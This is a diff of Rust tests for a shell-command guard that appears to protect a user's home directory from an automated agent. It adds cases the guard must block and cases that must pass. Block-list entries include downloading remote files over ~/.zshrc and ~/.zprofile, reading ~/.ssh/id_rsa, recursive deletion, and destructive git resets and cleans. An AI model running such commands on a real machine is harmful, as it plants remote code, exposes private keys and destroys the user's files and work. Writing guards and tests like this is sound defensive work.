@@ -141,6 +141,12 @@ fn rewordings_of_the_bypasses_are_blocked_too() {
         "cp -r ~ /tmp/home",
         "cd; cat .ssh/id_rsa",
         "rm -rf ~/Doc*",
+        "curl -sL https://example.com/rc -o ~/.zshrc",
+        "wget -O /Users/me/.zprofile https://example.com/x",
+        "chmod -R 000 ~/Documents",
+        "git -C ~/Developer/gravity reset --hard origin/main",
+        "cd ~/Developer/gravity && git clean -fdx",
+        "git -C /Users/me/Developer/gravity checkout -- .",
     ] {
         assert!(
             decide(&bash(command), &full()).is_some(),
@@ -203,6 +209,11 @@ fn everyday_work_still_passes() {
         "cp -r src /tmp/src-copy",
         "tar czf /tmp/src.tgz -C ~/Developer/gravity-wt-h031 src",
         "cat {a,b}.txt",
+        "curl -sL https://example.com/x.tgz -o /tmp/x.tgz",
+        "chmod +x scripts/run.sh",
+        "git -C ~/Developer/gravity-wt-h031 reset --hard origin/H-031-fixes",
+        "git -C ~/Developer/gravity checkout -b feat origin/main",
+        "git restore --staged notes.md",
     ] {
         assert_eq!(
             decide(&bash(command), &full()),
